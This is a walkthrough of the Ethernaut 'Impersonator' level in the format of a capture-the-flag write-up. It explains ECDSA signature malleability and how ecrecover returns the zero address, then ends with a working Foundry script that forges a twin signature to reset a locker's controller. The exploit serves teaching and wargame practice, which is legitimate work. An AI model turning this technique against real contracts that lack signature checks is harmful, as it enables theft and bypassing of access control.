# Ethernaut Level 32 Impersonator

Our goal is that *anyone* with any random signature v, r and s can open the `ECLocker` instance.

When we call `open(uint8 v, bytes32 r, bytes32 s)`, the internal function `_isValidSignature(uint8 v, bytes32 r, bytes32 s)` is used to check whether the (v, r, s), along with the `msgHash` that is initialized in the constructor, can `ecrecover` the address that have *signed* this signature. `msgHash` is the *note* that is signed by the signature. The signature has to satisfy two conditions:

1. `_address == controller`: The recovered address has be to the `controller`.
2. `!usedSignatures[signatureHash]` The signature hasn't been used.

To trick through condition 1, we have to call `changeController(uint8 v, bytes32 r, bytes32 s, address newController)` to **change the `controller` address to `address(0)`**. The reason lies in the `ecrecover` function itself. If the function cannot recover an address (v, r, s is wrong or a mismatch with the `msgHash`), the function itself doesn't revert (cancel the transaction execution), insread, the return data is read from empty memory. Therefore, it will return an `address(0)`.

However, we cannot use the exact same signature that is used in constructor to *change the controller*, since that signature is already used (condition 2). So how can we do that?

We can leave this question for now and take a deeper look at the constructor, which is the most complex part of the code. Though it is not really relavant to the solution itself, it is crucial to understand what `ecrecover` does under the hood. This part is referenced from [here](https://medium.com/@ynyesto/ethernaut-32-impersonator-825c0ea9d76d).

### Constructor

```solidity
bytes32 _msgHash;
assembly {
    mstore(0x00, "\x19Ethereum Signed Message:\n32") // 28 bytes
    mstore(0x1C, _lockId) // 32 bytes
    _msgHash := keccak256(0x00, 0x3c) //28 + 32 = 60 bytes
}
msgHash = _msgHash;
```

In this part, we want to construct the `msgHash` with the unique `_lockId`. The first 28 bytes in memory is a string header, followed by the 32 bytes `_lockId`. Then we *hash* the 60 bytes data and store it in `msgHash`.

```solidity
assembly {
            let ptr := mload(0x40)
            mstore(ptr, _msgHash) // 32 bytes
            mstore(add(ptr, 32), mload(add(_signature, 0x60))) // 32 byte v
            mstore(add(ptr, 64), mload(add(_signature, 0x20))) // 32 bytes r
            mstore(add(ptr, 96), mload(add(_signature, 0x40))) // 32 bytes s
            pop(
                staticcall(
                    gas(), // Amount of gas left for the transaction.
                    initialController, // Address of `ecrecover`.
                    ptr, // Start of input.
                    0x80, // Size of input.
                    0x00, // Start of output.
                    0x20 // Size of output.
                )
            )
            if iszero(returndatasize()) {
                mstore(0x00, 0x8baa579f) // `InvalidSignature()`.
                revert(0x1c, 0x04)
            }
            initialController := mload(0x00)
            mstore(0x40, add(ptr, 128))
        }

```

A pointer `ptr` is declared and initialized to the content of the 0x40 memory slot, and the message hash computed above is stored in the slot pointed to by `ptr`. An important note here is that in Solidity, there is a convention that the free-memory pointer (a pointer that points to the first free slot in the contract’s memory) is stored at memory position `0x40`. Its value always starts at `0x80` (128) and increases as memory is allocated.

Next, the v, r and s [ECDSA](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm) values are extracted from the `_signature` parameter by loading it from memory, one 32-byte chunk at a time, and saving each of the three in the free memory slots adjacent to the message hash (`_msgHash` being stored at the slot pointed to by `ptr` and v, r and s at slots with offsets of 32, 64 and 96 bytes from it, respectively).

Next, an external call is made, preceded by a `pop()` statement to discard its return value (see [here](https://platon-solidity.readthedocs.io/en/latest/assembly.html) the docs on Solidity Assembly), so that it doesn’t stay in the stack. On this `staticcall`, the address the call is made to is that of the aforementioned `ecrecover` precompile, and the input sent starts at `ptr` and has a size of 128 (0x80 in hex) bytes. Thus, we can see that the data sent are `_msgHash`, and the three ECDSA parameters that were just stored in memory. The output of the call is stored in memory at slot 0x00, overwriting the message prefix that was stored in it, and the beginning of the `_lockId` value at 0x1c, which are no longer needed.

Then, the size of the returned data is checked, lest it be zero, in which case the contract deployment should revert with an `InvalidSignature()` custom error, because that would mean that the returned address would be the null address, meaning the signature was not valid. If the revert is not triggered, the returned address is stored in `initialController` overwriting the 0x01 address and the free-memory slot is updated to keep pointing to the first empty slot of the contract’s memory, which is now 128 bytes greater, after the message hash and ECDSA parameters were stored in slots starting at `ptr`.

### ECDSA Signature Malleability

We also need some basic knowledge of ECDSA and signature malleability feature based on the feature of ECDSA.

![Elliptic curve](https://upload.wikimedia.org/wikipedia/commons/d/da/Elliptic_curve_simple.svg)

Above is the elliptic curve that we use to generate (v, r, s). We are not going to dive deep to the math of the ECDSA cryptography, all we have to know is that in the **Secp256k1** curve in the case of Bitcoin and Ethereum, it is **symmetrical** to the x-axis, which gives rise to the fact that (without going in depth into ECDSA math) there are two valid signatures for a message with the **same** private key, one corresponding to positive-y half of the curve and another for the negative one.

The actual value of v is either 27 or 28, which indicates which side of the curve that the signature lies in. And due to the symmetry feature, a new s' can be calculated as (n - s), where n is the order of the subgroup of elliptic curve points, generated by the generator point G. In **Secp256k1**, n is fixed at `0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141`.

So, for each of the signature (v, r, s), we have a twin *impersonator*: (v', r, s') that lies in the different half of the elliptic curve. This is called *Signature Malleability*.

### Attack

We can take advantage of this feature and answer the question raised above: how can we change the controller? It turns out that  we can use the *impersonator* (v', r, s') to call `changeController`, since both (v, r, s) and (v', r, s') can be recovered to the *same* public key of the original signer, we can easily satisfy all two conditions mentioned earlier in the writeup.

In order to calculate the (v', r, s'), we have to first fetch (v, r, s). We cannot use the trick `await web3.eth.getStorageAt()` since `Impersonator` is an `Ownable` and has storage protection. An easy way is to check the emitted event log on **Etherscan**. If you search the instance address and go to the event log, you will see something like this:

```
NewLock (index_topic_1 address lockAddress, uint256 lockId, uint256 timestamp, bytes signature)

[topic0] 0xac736e29adaa5052dee435c56ab8fe44ca41d6e5337e6b528e771ac85e97b7c3  
[topic1] 0x00000000000000000000000003fe6ac034d9b19c2286dc4717462e679d69f7062  

Hex →  
0000000000000000000000000000000000000000000000000000000000000539  
0000000000000000000000000000000000000000000000000000000068ff0ac  
0000000000000000000000000000000000000000000000000000000000000060  
1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91  
78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2  
000000000000000000000000000000000000000000000000000000000000001b

```

This is the emitted `Newlock` event. [topic0] is the selector of the event itself, and [topic1] stores the indexed `lockAddress`. Next two bytes32s are the `uint256 lockId` and the `uint256 timestamp`. Next five slots are for the `bytes signature`. The first 0x60 is the offset, which indicates that actual data starts at the fourth 32-byte slot. The second 0x60 is the length of the data, which takes 3 full 32-byte slots. The last 3 slots are corresponding r, s, and v.

So all we need is here. We can write the attack logic now:

`Impersonator.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script} from "forge-std/Script.sol";
import {Impersonator, ECLocker} from "../src/Impersonator.sol";

contract ImpersonatorScript is Script {
    Impersonator impersonator = Impersonator(0xXXXXXXXXX);
    ECLocker locker = impersonator.lockers(0);
    bytes32 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function run() external {
        vm.startBroadcast();
        uint8 v = 0x1b;
        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
        bytes32 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;

        uint8 new_v = (v == 27 ? 28 : 27);
        bytes32 new_s = bytes32(uint256(N) - uint256(s));

        locker.changeController(new_v, r, new_s, address(0));

        vm.stopBroadcast();
    }
}
```

Note that v is in type `uint8`. 
